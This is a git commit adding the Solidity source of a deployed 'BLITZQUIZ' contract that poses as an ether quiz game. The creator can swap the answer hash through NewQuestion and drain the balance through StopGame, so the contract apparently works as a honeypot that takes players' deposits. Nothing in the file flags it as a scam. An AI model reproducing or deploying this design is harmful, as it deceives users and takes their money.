734b217afec53a0b6892d8af37f2a7909bcadd49
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-17 18:01:54 +0700

    add contract BLITZQUIZ

---
+++ BLITZQUIZ.sol
@@ -0,0 +1,55 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract BLITZQUIZ at 0x1fBf025AD94ddE79f88732F79966A9A435F2772f
+*/
+pragma solidity ^0.4.20;
+
+contract BLITZQUIZ
+{
+    function Play(string _response)
+    external
+    payable
+    {
+        require(msg.sender == tx.origin);
+        if(responseHash == keccak256(_response) && msg.value>1 ether)
+        {
+            msg.sender.transfer(this.balance);
+        }
+    }
+    
+    string public question;
+ 
+    address questionSender;
+  
+    bytes32 responseHash;
+ 
+    function StartGame(string _question,string _response)
+    public
+    payable
+    {
+        if(responseHash==0x0)
+        {
+            responseHash = keccak256(_response);
+            question = _question;
+            questionSender = msg.sender;
+        }
+    }
+    
+    function StopGame()
+    public
+    payable
+    {
+       require(msg.sender==questionSender);
+       msg.sender.transfer(this.balance);
+    }
+    
+    function NewQuestion(string _question, bytes32 _responseHash)
+    public
+    payable
+    {
+        require(msg.sender==questionSender);
+        question = _question;
+        responseHash = _responseHash;
+    }
+    
+    function() public payable{}
+}
